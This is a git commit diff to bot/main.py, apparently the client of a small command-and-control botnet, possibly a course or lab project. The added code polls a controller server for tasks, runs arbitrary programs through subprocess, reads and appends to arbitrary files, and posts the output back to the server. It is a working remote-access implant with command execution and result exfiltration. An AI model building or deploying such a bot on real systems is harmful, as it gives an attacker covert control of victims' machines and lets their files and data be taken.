386b7aa1d3e907f07fbdeae8cdd3b2607cf715da
isaac-fletcher <ifletch@clemson.edu>
2024-11-15 15:20:26 -0500

    Updated bot script.

--- bot/main.py
+++ bot/main.py
@@ -6,48 +6,60 @@
 # ===---------------------------------------------------------------------=== #
 
 from aiohttp import ClientSession
+from subprocess import run
 from time import sleep
+from payloads import *
 import asyncio
 
+ID = None
 
-def parse_command(command: dict) -> None:
+SERVER_URL = "http://localhost:8080"
+
+async def parse_command(command: dict) -> None:
+    res = ""
+
     try:
         if command['action'] == 'execute':
-            bash_cmd = command['path'] + ' ' + ' '.join(command['payload'])
-            print(bash_cmd)
+            print([command['path']] + command['payload'])
+            proc = run([command['path']] + command['payload'], capture_output=True)
+            res = proc.stdout.decode()
         elif command['action'] == 'read':
-            # handle read
-            pass
+            with open(command['path'],  'r') as f:
+                res = f.read()
         elif command['action'] == 'write':
-            # handle write
-            pass
+            with open(command['path'], 'a') as f:
+                res = f.write(command['payload'][0])
         else:
-            print(f"Unknown action: {command['action']}")
+            res = f"Unknown action: {command['action']}"
+
     except Exception as e:
-        print(f'Exception in parsing command: {e}')
+        res = f'Exception in parsing command: {e}'
+    
+    async with ClientSession() as session:
+        url = f'{SERVER_URL}/result/'
+        async with session.post(url, json={"id": ID, "result": res}) as response:
+            pass
 
 async def obtain_id() -> dict:
     async with ClientSession() as session:
-        url = 'http://localhost:8080/init'
-        method = 'GET'
-        async with session.request(method, url) as response:
+        url = f'{SERVER_URL}/init'
+        async with session.get(url) as response:
             json_reply = await response.json()
             return json_reply['id']
 
-
 async def main():
-    id = await obtain_id()
+    global ID
+    ID = await obtain_id()
     cmd_queue = []
     while True:
         async with ClientSession() as session:
-            url = f'http://localhost:8080/check/{id}'
-            method = 'GET'
-            async with session.request(method, url) as response:
+            url = f'{SERVER_URL}/check/{ID}'
+            async with session.get(url) as response:
                 returned_cmds = await response.json()
                 for cmd in returned_cmds:
                     cmd_queue.append(cmd)
         if len(cmd_queue) > 0:
-            parse_command(cmd_queue.pop(0))
+            await parse_command(cmd_queue.pop(0))
         sleep(5)
 
 if __name__ == "__main__":
